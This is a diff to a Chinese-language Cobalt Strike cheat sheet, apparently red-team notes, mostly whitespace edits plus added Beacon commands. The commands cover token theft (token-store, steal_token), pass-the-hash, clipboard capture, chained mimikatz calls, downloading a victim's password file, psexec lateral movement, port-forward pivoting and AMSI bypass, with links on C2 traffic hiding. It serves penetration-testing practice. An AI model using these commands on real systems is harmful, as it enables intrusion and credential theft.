@@ -1,5 +1,6 @@
 https://mp.weixin.qq.com/s/F1H4ReV71gK7JeoYxV3n5g
 https://github.com/k8gege/Aggressor/releases/tag/cs
+
 ## 常用命令
 
 ```sh
@@ -14,7 +15,7 @@ desktop pid [x86|x64] low|high # VNC: vnc dll注入到指定进程中运行 注�
 ssh [host:port] [user][pass]
 drives: List current system drives.
 exit # 结束Beacon进程
-## 横向移动 
+## 横向移动
 beacon> rportfwd [listen_port][forward_host][forward_port]
 
 beacon> pth [DOMAIN\user] [NTLM hash]
@@ -46,18 +47,31 @@ powershell-import: Import a local powershell module in the current beacon proces
 powerpick: Execute powershell commands without spawning "powershell.exe", using only .net libraries and assemblies. (Bypasses AMSI and CLM)
 download C:\Users\victim\Documents\passwords.csv
 upload C:\Users\S1ckB0y1337\NotMalware\youvebeenhacked.txt
-dllinject pid dllpath #反射dll进程注入
-dllload pid dllpath  # 使用LoadLibrary函数进行dll注入
-elevate [exploit] [listener] # elevate 提权并生成一个高权限会话
-runasadmin [exploit] [command] [args] # runasadmin 提权后执行命令
-execute [program] [arguments] # execute 执行程序（无回显）
-execute-assembly .netpath [arguments] # 注：就是普通的内存加载执行.net程序
+dllinject pid dllpath                       #反射dll进程注入
+dllload pid dllpath                         # 使用LoadLibrary函数进行dll注入
+elevate [exploit] [listener]                # elevate 提权并生成一个高权限会话
+runasadmin [exploit] [command] [args]       # runasadmin 提权后执行命令
+execute [program] [arguments]               # execute 执行程序（无回显）
+execute-assembly .netpath [arguments]       # 注：就是普通的内存加载执行.net程序
 ssh [target:port] [user] [/path/to/key.pem]
 steal_token [pid] # steal_token 从进程中窃取访问令牌  # 注：可以使用getuid命令会打印你的当前令牌,rev2self恢复的原始令牌。
 socks 55409 SOCKS5 enableNoAuth "" "" disableLogging  # 4.7后
+clipboard # 获取剪贴板内容
+token-store steal [pid,…] <OpenProcessToken access mask> # token-store steal 5600，6116，6332，6840 https://cn-sec.com/archives/1592893.html
+token-store use [id]
+token-store steal-and-use [pid] <OpenProcessToken access mask>
+token-store show
+token-store remove [id,…]
+token-store remove-all
+sleep 2d 13h 45m 8s 30j，它的意思是"睡眠2天13小时45分钟8秒，带有30%的抖动"
+# 增加了一个新的侵略者功能，bsleepu，其工作方式与此相同
+# 在一个Mimikatz调用中链接多个命令
+mimikatz standard::coffee;standard::coffee
+file_browser              # 打开文件浏览器。
+process_browser           # 打开进程浏览器。
 ```
-[转发上线](####转发上线)
 
+[转发上线](####转发上线)
 
 ## 环境介绍
 
@@ -244,10 +258,12 @@ https://www.youtube.com/watch?time_continue=2&v=fnCLdPOmZOk&feature=emb_logo
 erwerwer
 
 ## Beacon/Cmd
+
 [Link](https://www.cnblogs.com/icui4cu/p/16056428.html)
-[Cobalt Strike Beacon命令](https://wbglil.gitbook.io/cobalt-strike/cobalt-strikemo-kuai-jie-shao)
+[Cobalt Strike Beacon 命令](https://wbglil.gitbook.io/cobalt-strike/cobalt-strikemo-kuai-jie-shao)
 
 Bind TCP Beacon 对应的是 connect 和 unlink.
+
 ```shell
 # ec2 - smb 是一个Listener
 beacon > jump psexec64 FILESERVER ec2 - smb
@@ -466,9 +482,10 @@ proxychains rdesktop 10.10.10.5
   - `rportfwd [listen port][forward host][forward port]`
   - Use `rportfwd stop [listen port] to stop`
 - Make sure to account for firewall on target!
-此转发的流量经过路径Beacon ----> cs teamserver -----> target host
+  此转发的流量经过路径 Beacon ----> cs teamserver -----> target host
 
 - rportfwd_local
+
 ```sh
 rportfwd_local 反向端口转发(cs客户端本地)
 rportfwd_local [bind port] [forward host] [forward port]
@@ -490,9 +507,10 @@ beacon> jump psexec ENGINEER pivot - POWERDC
 beacon> jump psexec BILLING pivot - POWERDC
 ```
 
-比如新建 a1listener, 目前不能直接生成executale
+比如新建 a1listener, 目前不能直接生成 executale
+
 - 只能命令横向上线
-- 或者上线后 spawn 为 a1listener, 再关掉旧的session
+- 或者上线后 spawn 为 a1listener, 再关掉旧的 session
 
 #### Pivot Listeners - 1
 
@@ -654,6 +672,7 @@ beacon >
 View - targets, 可手动或导入
 
 手动 192.168.1.0/24
+
 ## Plugins
 
 ### CrossC2/上线 Linux
@@ -839,7 +858,7 @@ sub dialog_test {
 [done 4/9 | Cobalt Strike Red Team Ops - Training Cours](https://www.youtube.com/playlist?list=PLcjpg2ik7YT6H5l9Jx-1ooRYpfvznAInJ)
 [干货分享 | 魔改 cs4.5--消除流量特征](https://mp.weixin.qq.com/s/g6sWwKkCMESAibj3CU87lQ)
 [基于 Caddy 实现的 C2 前置代理 - RedCaddy](https://mp.weixin.qq.com/s/usHrpgxCvGsu9vvf0SMSBQ)
-[C2隐藏 _ 让你的流量更隐蔽（二）](https://mp.weixin.qq.com/s/6WJUTKPgg9OgtKVkUbPucg)
+[C2 隐藏 \_ 让你的流量更隐蔽（二）](https://mp.weixin.qq.com/s/6WJUTKPgg9OgtKVkUbPucg)
 
 ## 使用帮助
 
@@ -850,7 +869,7 @@ sub dialog_test {
 [分享个 CobaltStrike 插件 Bypass 防护添加用户（附下载）](https://mp.weixin.qq.com/s/6nu1dwdvdtnP_6C-nIpMVg)
 [Cobalt-Strike 之 CrossC2 插件安装与 linux 上线](https://mp.weixin.qq.com/s/Fty2S9ettdtTFgJWVTvQNQ)
 [CobaltStrike 加载插件](https://mp.weixin.qq.com/s/NtxhTkuMGhhRyLUREnZQcA)
-[免杀 | Arsenal-kit | 聊聊红队攻防中CobalStrike的多维度对抗](https://mp.weixin.qq.com/s/fF6frplnurl-rCivYs0fFA)
+[免杀 | Arsenal-kit | 聊聊红队攻防中 CobalStrike 的多维度对抗](https://mp.weixin.qq.com/s/fF6frplnurl-rCivYs0fFA)
 
 ## Vocabulary
 
